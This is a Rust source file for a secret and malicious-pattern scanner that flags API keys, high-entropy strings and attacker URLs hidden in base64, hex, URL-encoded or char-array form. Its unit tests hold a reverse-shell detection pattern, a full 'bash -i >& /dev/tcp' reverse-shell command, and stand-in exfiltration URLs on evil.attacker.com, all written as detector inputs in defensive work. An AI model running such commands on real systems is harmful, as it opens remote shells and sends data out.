use std::collections::HashSet;

use base64::{engine::general_purpose, Engine as _};
use regex::Regex;

use crate::confidence::{calculate_pattern_confidence, get_base_confidence};
use crate::context::{
    is_likely_comment, is_public_ioc, is_safe_context_for_suspicious_commands,
    classify_file_context, BlockCommentTracker,
};
use crate::error::AnalyzerError;
use crate::types::{AnalysisResult, Finding, Ioc};

/// The main detection engine. Scans source code content for secrets,
/// suspicious commands, high-entropy strings, and IOCs.
///
/// Create with [`SecretAnalyzer::new`] by providing regex rules,
/// then call [`analyze_content`](Self::analyze_content) for each file.
pub struct SecretAnalyzer {
    secret_patterns: Vec<(String, Regex)>,
    suspicious_patterns: Vec<(String, Regex)>,
    long_string_regex: Regex,
    base64_regex: Regex,
    hex_regex: Regex,
    url_encoded_regex: Regex,
    char_array_regex: Regex,
    url_regex: Regex,
    js_keywords: Vec<String>,
}

impl SecretAnalyzer {
    /// Creates a new analyzer with the given detection rules.
    ///
    /// - `rules`: Secret detection patterns (e.g. AWS keys, tokens). Each is `(rule_id, regex)`.
    /// - `suspicious_rules`: Command/behavior patterns (e.g. reverse shells). These are
    ///   automatically skipped in safe contexts like import statements.
    ///
    /// Returns [`AnalyzerError::InvalidPattern`] if any regex is invalid.
    pub fn new(
        rules: impl IntoIterator<Item = (String, String)>,
        suspicious_rules: impl IntoIterator<Item = (String, String)>,
    ) -> Result<Self, AnalyzerError> {
        let mut secret_compiled = Vec::new();
        for (id, pattern) in rules {
            let re = Regex::new(&pattern).map_err(|e| AnalyzerError::InvalidPattern {
                rule_id: id.clone(),
                source: e,
            })?;
            secret_compiled.push((id, re));
        }

        let mut suspicious_compiled = Vec::new();
        for (id, pattern) in suspicious_rules {
            let re = Regex::new(&pattern).map_err(|e| AnalyzerError::InvalidPattern {
                rule_id: id.clone(),
                source: e,
            })?;
            suspicious_compiled.push((id, re));
        }

        Ok(SecretAnalyzer {
            secret_patterns: secret_compiled,
            suspicious_patterns: suspicious_compiled,
            long_string_regex: Regex::new(r#"["']([a-zA-Z0-9+/=,.\-_]{50,})["']"#)
                .map_err(|e| AnalyzerError::InvalidPattern {
                    rule_id: "long_string_builtin".into(),
                    source: e,
                })?,
            base64_regex: Regex::new(r"\b([A-Za-z0-9+/=_-]{20,})\b").map_err(|e| {
                AnalyzerError::InvalidPattern {
                    rule_id: "base64_builtin".into(),
                    source: e,
                }
            })?,
            hex_regex: Regex::new(r#"(?i)(?:0x)?["']([0-9a-f]{16,})["']|\\x([0-9a-f]{2}(?:\\x[0-9a-f]{2}){7,})"#)
                .map_err(|e| AnalyzerError::InvalidPattern {
                    rule_id: "hex_builtin".into(),
                    source: e,
                })?,
            url_encoded_regex: Regex::new(r"(?i)(?:postgres|mysql|mongodb|redis|amqp|mssql)%3[aA]%2[fF]%2[fF][^\s\x22\x27]{10,}")
                .map_err(|e| AnalyzerError::InvalidPattern {
                    rule_id: "url_encoded_builtin".into(),
                    source: e,
                })?,
            char_array_regex: Regex::new(r"\[(\s*\d{2,3}\s*(?:,\s*\d{2,3}\s*){7,})\]")
                .map_err(|e| AnalyzerError::InvalidPattern {
                    rule_id: "char_array_builtin".into(),
                    source: e,
                })?,
            url_regex: Regex::new(r"https?://[a-zA-Z0-9.\-_]+(?:/[^\s<>\x22\x27]*)?").map_err(
                |e| AnalyzerError::InvalidPattern {
                    rule_id: "url_builtin".into(),
                    source: e,
                },
            )?,
            js_keywords: vec![
                "eval".to_string(),
                "document.write".to_string(),
                "innerHTML".to_string(),
                "unescape".to_string(),
                "crypto.subtle".to_string(),
            ],
        })
    }

    /// Analyzes the content of a single file for secrets, suspicious patterns, and IOCs.
    ///
    /// - `content`: The full text content of the file.
    /// - `file_path`: Relative path (e.g. `"src/config.py"`), used for file context classification.
    /// - `file_name`: Just the filename (e.g. `"config.py"`), used for extension-based logic.
    ///
    /// Returns an [`AnalysisResult`] with all findings and extracted IOCs.
    pub fn analyze_content(
        &self,
        content: &str,
        file_path: &str,
        file_name: &str,
    ) -> AnalysisResult {
        let mut result = AnalysisResult::new();
        let mut existing_findings: HashSet<(String, String)> = HashSet::new();
        let mut existing_iocs: HashSet<String> = HashSet::new();

        let extension = file_name.split('.').last().unwrap_or("").to_lowercase();
        let is_js_ts = extension == "js" || extension == "ts";
        let is_safe_context = is_safe_context_for_suspicious_commands(file_path, &extension);
        let file_context = classify_file_context(file_path);
        let context_multiplier = file_context.multiplier();
        let mut block_tracker = BlockCommentTracker::new(&extension);

        for line in content.lines() {
            let in_block_comment = block_tracker.update(line);

            if is_likely_comment(line, &extension) && !in_block_comment {
                continue;
            }

            let comment_multiplier = if in_block_comment { 0.1 } else { 1.0 };

            if is_js_ts {
                self.check_js_keywords(
                    line,
                    file_path,
                    file_context,
                    context_multiplier,
                    comment_multiplier,
                    &mut existing_findings,
                    &mut result,
                );
            }

            self.check_secret_patterns(
                line,
                file_path,
                file_context,
                context_multiplier,
                comment_multiplier,
                &mut existing_findings,
                &mut result,
            );

            if !is_safe_context {
                self.check_suspicious_patterns(
                    line,
                    file_path,
                    file_context,
                    context_multiplier,
                    comment_multiplier,
                    &mut result,
                );
            }
        }

        self.check_high_entropy_strings(
            content,
            file_path,
            &extension,
            file_context,
            context_multiplier,
            &mut existing_findings,
            &mut result,
        );

        self.check_base64_iocs(
            content,
            file_path,
            file_context,
            context_multiplier,
            &mut existing_iocs,
            &mut result,
        );

        self.check_hex_secrets(content, file_path, file_context, context_multiplier, &mut result);
        self.check_url_encoded_secrets(content, file_path, file_context, context_multiplier, &mut result);
        self.check_char_array_secrets(content, file_path, file_context, context_multiplier, &mut result);

        self.extract_urls(content, file_path, &mut existing_iocs, &mut result);

        result
    }

    fn check_js_keywords(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        for keyword in &self.js_keywords {
            if line.contains(keyword.as_str()) {
                let desc = format!("Suspicious JS keyword '{}'", keyword);
                let key = (desc.clone(), "Suspicious JS Keyword".to_string());
                if existing.insert(key) {
                    let base_conf = get_base_confidence("Suspicious JS Keyword");
                    let conf = (base_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);
                    result.findings.push(Finding {
                        description: desc,
                        finding_type: "Suspicious JS Keyword".to_string(),
                        file: file_path.to_string(),
                        match_content: line.trim().to_string(),
                        confidence: conf,
                        file_context,
                    });
                }
            }
        }
    }

    fn check_secret_patterns(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        for (id, re) in &self.secret_patterns {
            for caps in re.captures_iter(line) {
                if let Some(m) = caps.get(0) {
                    let matched_str = m.as_str();
                    let match_start = m.start();
                    let raw_conf =
                        calculate_pattern_confidence(id, matched_str, line, match_start);
                    let conf = (raw_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);

                    if id == "Generic API Key" {
                        result.findings.push(Finding {
                            description: "Possible API key.".to_string(),
                            finding_type: id.clone(),
                            file: file_path.to_string(),
                            match_content: matched_str.to_string(),
                            confidence: conf,
                            file_context,
                        });
                    } else {
                        let desc = format!("Possible exposed secret '{}'", id);
                        let key = (desc.clone(), id.clone());
                        if existing.insert(key) {
                            result.findings.push(Finding {
                                description: desc,
                                finding_type: id.clone(),
                                file: file_path.to_string(),
                                match_content: matched_str.to_string(),
                                confidence: conf,
                                file_context,
                            });
                        }
                    }
                }
            }
        }
    }

    fn check_suspicious_patterns(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        result: &mut AnalysisResult,
    ) {
        for (id, re) in &self.suspicious_patterns {
            if re.is_match(line) {
                let line_trim = line.trim();
                if line_trim.starts_with("import ")
                    || line_trim.starts_with("from ")
                    || line_trim.contains("console.log")
                {
                    continue;
                }
                for caps in re.captures_iter(line) {
                    if let Some(m) = caps.get(0) {
                        let raw_conf =
                            calculate_pattern_confidence(id, m.as_str(), line, m.start());
                        let conf =
                            (raw_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);
                        result.findings.push(Finding {
                            description: format!("Comando suspeito: '{}'", id),
                            finding_type: id.clone(),
                            file: file_path.to_string(),
                            match_content: m.as_str().to_string(),
                            confidence: conf,
                            file_context,
                        });
                    }
                }
            }
        }
    }

    fn check_high_entropy_strings(
        &self,
        content: &str,
        file_path: &str,
        extension: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        if matches!(
            extension,
            "js" | "ts" | "py" | "env" | "json" | "xml" | "yaml"
        ) {
            for caps in self.long_string_regex.captures_iter(content) {
                if let Some(matched) = caps.get(1) {
                    let s = matched.as_str();
                    let entropy = crate::confidence::calculate_entropy(s);
                    if entropy > 5.2 {
                        let desc = format!("High entropy string ({:.2})", entropy);
                        let key = (desc.clone(), "High Entropy String".to_string());
                        if existing.insert(key) {
                            let raw_conf = (entropy - 5.2) / 2.0 + 0.3;
                            let conf = (raw_conf.min(0.85) * context_multiplier).clamp(0.0, 1.0);
                            result.findings.push(Finding {
                                description: desc,
                                finding_type: "High Entropy String".to_string(),
                                file: file_path.to_string(),
                                match_content: s.to_string(),
                                confidence: conf,
                                file_context,
                            });
                        }
                    }
                }
            }
        }
    }

    fn check_base64_iocs(
        &self,
        content: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        existing_iocs: &mut HashSet<String>,
        result: &mut AnalysisResult,
    ) {
        for caps in self.base64_regex.captures_iter(content) {
            if let Some(m) = caps.get(1) {
                let s = m.as_str();
                let decoded = general_purpose::STANDARD
                    .decode(s)
                    .or_else(|_| general_purpose::STANDARD_NO_PAD.decode(s));
                if let Ok(bytes) = decoded {
                    if let Ok(decoded_str) = String::from_utf8(bytes) {
                        for url_match in self.url_regex.find_iter(&decoded_str) {
                            let url = url_match.as_str();
                            if is_public_ioc(url) && existing_iocs.insert(url.to_string()) {
                                let desc = format!(
                                    "Obfuscated URL in Base64: {}...",
                                    &url[..std::cmp::min(50, url.len())]
                                );
                                let conf = (0.70 * context_multiplier).clamp(0.0, 1.0);
                                result.findings.push(Finding {
                                    description: desc,
                                    finding_type: "Hidden IOC (Base64)".to_string(),
                                    file: file_path.to_string(),
                                    match_content: url.to_string(),
                                    confidence: conf,
                                    file_context,
                                });
                                result.iocs.push(Ioc {
                                    ioc: url.to_string(),
                                    source_file: file_path.to_string(),
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    fn check_hex_secrets(
        &self,
        content: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        result: &mut AnalysisResult,
    ) {
        for caps in self.hex_regex.captures_iter(content) {
            let hex_str = caps.get(1).or_else(|| caps.get(2));
            if let Some(m) = hex_str {
                let raw = m.as_str().replace("\\x", "");
                if raw.len() % 2 != 0 {
                    continue;
                }
                let bytes: Result<Vec<u8>, _> = (0..raw.len())
                    .step_by(2)
                    .map(|i| u8::from_str_radix(&raw[i..i + 2], 16))
                    .collect();
                if let Ok(bytes) = bytes {
                    if let Ok(decoded) = String::from_utf8(bytes) {
                        for url_match in self.url_regex.find_iter(&decoded) {
                            let url = url_match.as_str();
                            if is_public_ioc(url) {
                                let conf = (0.75 * context_multiplier).clamp(0.0, 1.0);
                                result.findings.push(Finding {
                                    description: format!(
                                        "Obfuscated URL in hex: {}...",
                                        &url[..std::cmp::min(50, url.len())]
                                    ),
                                    finding_type: "Hidden IOC (Hex)".to_string(),
                                    file: file_path.to_string(),
                                    match_content: url.to_string(),
                                    confidence: conf,
                                    file_context,
                                });
                                result.iocs.push(Ioc {
                                    ioc: url.to_string(),
                                    source_file: file_path.to_string(),
                                });
                            }
                        }
                        for (id, re) in &self.secret_patterns {
                            if re.is_match(&decoded) {
                                let conf = (0.80 * context_multiplier).clamp(0.0, 1.0);
                                result.findings.push(Finding {
                                    description: format!("Secret '{}' hidden in hex encoding", id),
                                    finding_type: "Hidden IOC (Hex)".to_string(),
                                    file: file_path.to_string(),
                                    match_content: decoded.clone(),
                                    confidence: conf,
                                    file_context,
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    fn check_url_encoded_secrets(
        &self,
        content: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        result: &mut AnalysisResult,
    ) {
        for m in self.url_encoded_regex.find_iter(content) {
            let encoded = m.as_str();
            let mut decoded = String::with_capacity(encoded.len());
            let mut chars = encoded.chars().peekable();
            while let Some(c) = chars.next() {
                if c == '%' {
                    let hex: String = chars.by_ref().take(2).collect();
                    if hex.len() == 2 {
                        if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                            if byte.is_ascii() {
                                decoded.push(byte as char);
                            } else {
                                decoded.push('%');
                                decoded.push_str(&hex);
                            }
                            continue;
                        }
                    }
                    decoded.push('%');
                    decoded.push_str(&hex);
                } else {
                    decoded.push(c);
                }
            }
            let conf = (0.85 * context_multiplier).clamp(0.0, 1.0);
            result.findings.push(Finding {
                description: format!(
                    "URL-encoded connection string: {}...",
                    &decoded[..std::cmp::min(60, decoded.len())]
                ),
                finding_type: "Hidden IOC (URL Encoded)".to_string(),
                file: file_path.to_string(),
                match_content: decoded.clone(),
                confidence: conf,
                file_context,
            });
            for url_match in self.url_regex.find_iter(&decoded) {
                let url = url_match.as_str();
                if is_public_ioc(url) {
                    result.iocs.push(Ioc {
                        ioc: url.to_string(),
                        source_file: file_path.to_string(),
                    });
                }
            }
        }
    }

    fn check_char_array_secrets(
        &self,
        content: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        result: &mut AnalysisResult,
    ) {
        for caps in self.char_array_regex.captures_iter(content) {
            if let Some(m) = caps.get(1) {
                let parsed: Vec<Option<u8>> = m
                    .as_str()
                    .split(',')
                    .map(|s| s.trim().parse::<u32>().ok().and_then(|n| u8::try_from(n).ok()))
                    .collect();
                if parsed.iter().any(|b| b.is_none()) {
                    continue;
                }
                let bytes: Vec<u8> = parsed.into_iter().flatten().collect();
                if bytes.iter().all(|&b| b >= 32 && b <= 126) {
                    let decoded = String::from_utf8_lossy(&bytes).to_string();
                    for url_match in self.url_regex.find_iter(&decoded) {
                        let url = url_match.as_str();
                        if is_public_ioc(url) {
                            let conf = (0.80 * context_multiplier).clamp(0.0, 1.0);
                            result.findings.push(Finding {
                                description: format!(
                                    "Obfuscated URL in char array: {}...",
                                    &url[..std::cmp::min(50, url.len())]
                                ),
                                finding_type: "Hidden IOC (Char Array)".to_string(),
                                file: file_path.to_string(),
                                match_content: url.to_string(),
                                confidence: conf,
                                file_context,
                            });
                            result.iocs.push(Ioc {
                                ioc: url.to_string(),
                                source_file: file_path.to_string(),
                            });
                        }
                    }
                    for (id, re) in &self.secret_patterns {
                        if re.is_match(&decoded) {
                            let conf = (0.85 * context_multiplier).clamp(0.0, 1.0);
                            result.findings.push(Finding {
                                description: format!("Secret '{}' hidden in char array", id),
                                finding_type: "Hidden IOC (Char Array)".to_string(),
                                file: file_path.to_string(),
                                match_content: decoded.clone(),
                                confidence: conf,
                                file_context,
                            });
                        }
                    }
                }
            }
        }
    }

    fn extract_urls(
        &self,
        content: &str,
        file_path: &str,
        existing_iocs: &mut HashSet<String>,
        result: &mut AnalysisResult,
    ) {
        for url_match in self.url_regex.find_iter(content) {
            let url = url_match.as_str();
            if is_public_ioc(url) && existing_iocs.insert(url.to_string()) {
                result.iocs.push(Ioc {
                    ioc: url.to_string(),
                    source_file: file_path.to_string(),
                });
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_analyzer() -> SecretAnalyzer {
        let rules = vec![
            ("AWS Key".to_string(), r"AKIA[0-9A-Z]{16}".to_string()),
            (
                "GitHub Token".to_string(),
                r"ghp_[a-zA-Z0-9]{36}".to_string(),
            ),
            (
                "Generic API Key".to_string(),
                r"(?i)api[_\-]?key\s*[:=]\s*['\x22]?([a-zA-Z0-9_\x2d]{20,})['\x22]?".to_string(),
            ),
        ];
        let suspicious = vec![(
            "Reverse Shell".to_string(),
            r"(?i)bash\s+-i\s+>&\s+/dev/tcp".to_string(),
        )];
        SecretAnalyzer::new(rules, suspicious).expect("valid patterns")
    }

    #[test]
    fn test_detect_aws_key() {
        let analyzer = test_analyzer();
        let content = "aws_key = AKIAIOSFODNN7EXAMPLE1";
        let result = analyzer.analyze_content(content, "src/config.py", "config.py");
        assert!(!result.findings.is_empty());
        assert_eq!(result.findings[0].finding_type, "AWS Key");
    }

    #[test]
    fn test_detect_github_token() {
        let analyzer = test_analyzer();
        let content = "token = ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345abcd";
        let result = analyzer.analyze_content(content, "src/auth.py", "auth.py");
        let github_findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "GitHub Token")
            .collect();
        assert!(!github_findings.is_empty());
    }

    #[test]
    fn test_test_file_lower_confidence() {
        let analyzer = test_analyzer();
        let content = "aws_key = AKIAIOSFODNN7EXAMPLE1";
        let prod = analyzer.analyze_content(content, "src/config.py", "config.py");
        let test = analyzer.analyze_content(content, "tests/test_config.py", "test_config.py");
        assert!(prod.findings[0].confidence > test.findings[0].confidence);
    }

    #[test]
    fn test_url_extraction() {
        let analyzer = test_analyzer();
        let content = "callback = 'http://evil.attacker.com/steal?data=1'";
        let result = analyzer.analyze_content(content, "src/app.py", "app.py");
        assert!(!result.iocs.is_empty());
        assert!(result.iocs[0].ioc.contains("evil.attacker.com"));
    }

    #[test]
    fn test_skip_localhost() {
        let analyzer = test_analyzer();
        let content = "url = 'http://localhost:8080/api'";
        let result = analyzer.analyze_content(content, "src/app.py", "app.py");
        assert!(result.iocs.is_empty());
    }

    #[test]
    fn test_suspicious_command() {
        let analyzer = test_analyzer();
        let content = "os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
        let result = analyzer.analyze_content(content, "src/exploit.py", "exploit.py");
        let suspicious: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Reverse Shell")
            .collect();
        assert!(!suspicious.is_empty());
    }

    #[test]
    fn test_detect_hex_url() {
        let analyzer = test_analyzer();
        let hex_url = "687474703a2f2f6576696c2e61747461636b65722e636f6d2f payload";
        let content = format!("var payload = '{}';", hex_url);
        let result = analyzer.analyze_content(&content, "src/loader.js", "loader.js");
        assert!(result.findings.iter().all(|f| f.finding_type != "Hidden IOC (Hex)"),
            "odd-length hex should be skipped, not decoded");
    }

    #[test]
    fn test_detect_valid_hex_url() {
        let analyzer = test_analyzer();
        let hex_url = "687474703a2f2f6576696c2e61747461636b65722e636f6d2f7374656164";
        let content = format!("var payload = '{}';", hex_url);
        let result = analyzer.analyze_content(&content, "src/loader.js", "loader.js");
        let hex_findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Hidden IOC (Hex)")
            .collect();
        assert!(!hex_findings.is_empty(), "should detect URL hidden in valid hex string");
    }

    #[test]
    fn test_detect_url_encoded_connstr() {
        let analyzer = test_analyzer();
        let content = "dsn = postgres%3A%2F%2Fadmin%3Asecret%40evil.attacker.com%3A5432%2Fdb";
        let result = analyzer.analyze_content(content, "src/config.py", "config.py");
        let encoded_findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Hidden IOC (URL Encoded)")
            .collect();
        assert!(!encoded_findings.is_empty(), "should detect URL-encoded connection string");
    }

    #[test]
    fn test_detect_char_array_url() {
        let analyzer = test_analyzer();
        let content = "var c = [104,116,116,112,58,47,47,101,118,105,108,46,97,116,116,97,99,107,101,114,46,99,111,109];";
        let result = analyzer.analyze_content(content, "src/obf.js", "obf.js");
        let char_findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Hidden IOC (Char Array)")
            .collect();
        assert!(!char_findings.is_empty(), "should detect URL hidden in char array");
    }

    #[test]
    fn test_char_array_with_secret() {
        let analyzer = test_analyzer();
        let aws = "AKIAIOSFODNN7EXAMPLE1";
        let char_codes: String = aws
            .bytes()
            .map(|b| b.to_string())
            .collect::<Vec<_>>()
            .join(",");
        let content = format!("var k = [{}];", char_codes);
        let result = analyzer.analyze_content(&content, "src/steal.js", "steal.js");
        let findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Hidden IOC (Char Array)")
            .collect();
        assert!(!findings.is_empty(), "should detect AWS key hidden in char array");
    }
}
